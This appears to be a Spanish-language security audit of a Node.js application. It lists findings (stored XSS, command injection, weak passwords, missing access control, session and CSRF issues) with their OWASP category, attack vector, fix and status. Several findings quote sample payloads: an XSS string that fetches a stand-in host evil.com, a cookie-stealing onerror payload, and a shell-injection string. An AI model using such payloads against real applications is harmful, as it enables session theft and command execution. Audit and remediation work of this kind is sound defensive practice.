C-01 Stored XSS en renderizado de Ideas CORREGIDO
OWASP A7 — Cross-Site Scripting public/js/main.js

Problema: Multiples campos del objeto idea se inyectaban en innerHTML sin escapeHtml(): para_type, assigned_to, priority, estimated_time, created_by, contexto, suggested_agent.

Vector: Un usuario crea una idea con assigned_to: </span><img src=x onerror=fetch('//evil.com')>. Todos los que vean la idea ejecutan el payload.

Impacto: Robo de sesiones, escalacion de privilegios, defacement.

Fix: escapeHtml() aplicado a todos los campos interpolados en innerHTML y atributos onclick.

C-02 Stored XSS via Markdown sin sanitizar CORREGIDO
OWASP A7 — Cross-Site Scripting routes/files.js + views/archivo.ejs

Problema: marked(content) convertia markdown a HTML sin sanitizacion. Se renderizaba con <%- content %> (salida sin escapar).

Vector: Subir archivo .md con <img src=x onerror="steal_cookies()">.

Fix: Instalado isomorphic-dompurify, aplicado DOMPurify.sanitize(marked(content)).

C-03 Command Injection en Orchestrator Bridge CORREGIDO
OWASP A3 — Injection services/orchestratorBridge.js

Problema: exec(`start "" "${targetPath}"`) usaba shell, permitiendo inyeccion con caracteres especiales como " & calc.exe & ".

Fix: Reemplazo de exec() por execFile() (sin shell), validacion de path, regex estricto para nombres de script.

A-01 Politica de contrasenas debil (minimo 4 chars) CORREGIDO
OWASP A7 — Authentication Failuresadmin.js, auth.js, main.js

Problema: Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles.

Fix: Minimo subido a 8 caracteres en backend y frontend.

A-02 API Key expuesta en URL query string CORREGIDO
OWASP A2 — Broken Authenticationmiddleware/auth.js

Problema: API key aceptada como ?api_key=xxx, quedando en logs, historial, Referer headers.

Fix: Solo se acepta X-API-Key header. Query param eliminado.

A-03 Creacion de API Keys sin control de acceso CORREGIDO
OWASP A1 — Broken Access Controlroutes/external.js

Problema: GET /api/keys y POST /api/keys sin requireAdmin. Cualquier usuario podia crear API keys con permisos read,write.

Fix: requireAdmin agregado a ambos endpoints.

A-04 Endpoints sensibles sin restriccion de rol CORREGIDO
OWASP A1 — Broken Access Controlroutes/admin.js

Problema: GET /api/users, GET /api/export, GET /api/export-excel accesibles por cualquier usuario autenticado. Exponían datos sensibles (locked_until, twofa_enabled, toda la BD).

Fix: requireAdmin en los tres endpoints.

A-05 Webhook Fireflies sin autenticacion CORREGIDO
OWASP A1 — Broken Access Controlserver.js

Problema: POST /webhook/fireflies montado antes de requireAuth, sin API key. Cualquiera en internet podia enviar datos falsos de reuniones.

Fix: Requiere X-API-Key header.

M-01 Session cookie sin flag secure CORREGIDO
server.js

Problema: secure: false hardcodeado. Cookie podia enviarse por HTTP.

Fix: secure: NODE_ENV === 'production'

M-02 CSRF parcial — DELETE/PUT sin verificacion ACEPTADO
server.js

CSRF middleware solo chequea POST. DELETE/PUT dependen de CORS. Con XSS corregido (C-01), riesgo residual bajo.

M-03 SQL con LIMIT/OFFSET interpolado CORREGIDO
routes/ideas.js, routes/gtd.js

Problema: LIMIT ${limitNum} en template literal. Aunque parseInt() mitiga, es anti-patron.

Fix: Convertido a LIMIT ? OFFSET ? con parametros.

M-04 Audit log sin retencion automatica PENDIENTE
Tabla audit_log

La tabla crece indefinidamente. Recomendacion: agregar cron que elimine registros >90 dias.

M-05 Trusted device hash solo usaba User-Agent CORREGIDO
helpers/twofa.js, routes/twofa.js

Problema: Hash basado solo en User-Agent (facilmente spoofeable). Atacante podia clonar trusted device.

Fix: Hash ahora combina User-Agent + IP.

B-01 bcrypt cost factor 10 ACEPTADO

OWASP recomienda 12+ para 2026. Factor 10 aun es seguro pero no optimo.

B-02 /health expone uptime y build ID ACEPTADO

Informacion util para reconocimiento pero bajo impacto.

B-03 Error messages podrian filtrar info en dev ACEPTADO

Controlado por NODE_ENV. En produccion no se exponen stacks.

B-04 Password default de PostgreSQL en docker-compose.yml ACEPTADO

Repo privado, .env override en produccion. Default solo para desarrollo.

Lecciones Aprendidas

1. Escapar siempre, no solo a veces. Si escapeHtml() existe, debe usarse en CADA campo de la BD. La inconsistencia es peor que no tener la funcion.
2. Minimos de password actualizados. 4 caracteres nunca fue aceptable. NIST 800-63B: minimo 8 sin restricciones de complejidad.
3. exec() nunca con input del usuario. Siempre usar execFile() o spawn() con argumentos separados.
4. Autorizacion explicita por endpoint. "Esta detras de requireAuth" no basta. Endpoints sensibles necesitan requireAdmin.
5. Webhooks publicos = puertas abiertas. Siempre requerir firma HMAC o API key.
